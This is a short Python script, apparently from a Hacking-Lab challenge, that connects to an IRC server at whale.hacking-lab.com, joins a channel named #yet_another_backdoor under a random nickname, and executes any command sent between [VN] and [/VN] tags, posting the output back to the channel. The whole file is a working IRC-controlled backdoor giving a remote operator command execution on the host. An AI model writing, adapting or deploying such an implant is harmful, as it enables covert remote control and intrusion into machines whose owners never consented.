import socket
import sys
import random
import string
import time
import base64
import hashlib
import os
from easyprocess import EasyProcess

def rand_name(): return hashlib.md5(os.urandom(32)).hexdigest()

nickname = rand_name()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('whale.hacking-lab.com', 6667))

def send(txt):
    try: s.send(txt + '\r\n')
    except: pass

send('USER ' + nickname + ' ' + nickname + ' ' + nickname + ' :' + nickname)
send('NICK ' + nickname)
time.sleep(0.5)
send('JOIN #yet_another_backdoor')
time.sleep(0.5)

def post_channel(msg):
    try: send('PRIVMSG #yet_another_backdoor :' + msg)
    except: pass

while True:
    text = ''
    try: text = s.recv(2040)
    except: pass
    if '[VN]' and '[/VN]'  in text:
        if 'kill' not in text:
            try:
                plain = text[text.index('[VN]')+len('[VN]'):]
                plain = plain[:plain.index('[/VN]')]

                answer = EasyProcess(plain).call(timeout=5).stdout
                answer = answer.replace('\n','')
                post_channel(answer)
            except: pass
